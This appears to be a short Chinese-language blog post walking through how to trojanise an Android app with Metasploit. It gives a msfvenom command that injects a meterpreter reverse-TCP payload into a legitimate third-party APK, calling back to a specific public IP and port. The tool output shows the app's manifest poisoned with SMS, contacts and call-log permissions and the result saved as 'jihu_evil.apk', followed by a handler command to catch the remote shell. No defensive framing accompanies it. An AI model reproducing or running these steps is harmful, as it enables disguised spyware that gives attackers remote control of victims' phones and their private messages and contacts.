---
title: 利用msf框架对安卓手机进行简单操作
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2022-03-14 19:11:40
top:
tags:
layout:
---
编写进度
- [x] 

aptkool

利用msf框架对安卓手机进行简单操作 


渗透安卓


1. 环境准备
 		1.  `brew install --cask android-sdk  && brew install apktool`  
 		2.   `sdkmanager "platform-tools" "build-tools;28.0.3" "platforms;android-28" `  安装zipalign
 		3.   `export PATH=$PATH:/usr/local/Caskroom/android-sdk/4333796/build-tools/28.0.3`   配置zipalign
 		4.   
2. 制作APK
```zsh
msfvenom --platform android 
         -x Desktop/jihu.jihuapp_2.7.12_20712.apk 
         -p android/meterpreter/reverse_tcp 
         lhost=101.132.34.104 lport=19003 
         -o Desktop/jihu_evil.apk
		 
Using APK template: Desktop/jihu.jihuapp_2.7.12_20712.apk
[-] No arch selected, selecting arch: dalvik from the payload
[*] Creating signing key and keystore..
[*] Decompiling original APK..
[*] Decompiling payload APK..
[*] Locating hook point..
[*] Adding payload as package jihu.jihuapp.glfku
[*] Loading /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/original/smali_classes4/jihu/jihuapp/MainActivity.smali and injecting payload..
[*] Poisoning the manifest with meterpreter permissions..
[*] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
[*] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/>
[*] Adding <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
[*] Adding <uses-permission android:name="android.permission.SEND_SMS"/>
[*] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/>
[*] Adding <uses-permission android:name="android.permission.CALL_PHONE"/>
[*] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
[*] Adding <uses-permission android:name="android.permission.READ_CONTACTS"/>
[*] Adding <uses-permission android:name="android.permission.READ_SMS"/>
[*] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/>
[*] Adding <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
[*] Adding <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
[*] Rebuilding apk with meterpreter injection as /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk
[*] Signing /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk
[*] Aligning /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk
Payload size: 23173289 bytes
Saved as: Desktop/jihu_evil.apk
```


3 监听
```zsh
handler -H 101.132.34.104 -P 19003 -p android/meterpreter/reverse_tcp
```
